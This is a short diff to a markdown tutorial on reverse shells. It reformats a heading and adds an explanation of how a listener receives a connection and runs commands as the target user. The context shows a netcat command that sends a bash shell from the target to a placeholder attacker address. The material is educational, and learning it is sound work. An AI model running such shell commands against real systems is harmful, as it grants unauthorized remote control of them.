@@ -58,7 +58,7 @@ As a general rule, reverse shells are easier to execute and debug, however, we w
 
 ---
 
-**Reverse Shell example:**
+*Reverse Shell example:*
 
 Let's start with the more common reverse shell.
 
@@ -75,4 +75,6 @@ On the target:
 _nc <LOCAL-IP> <PORT> -e /bin/bash_
 
 <img width="1051" height="156" alt="image" src="https://github.com/user-attachments/assets/d66e5f66-f5db-404e-83c3-add57451dab6" />
+
+Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.
 
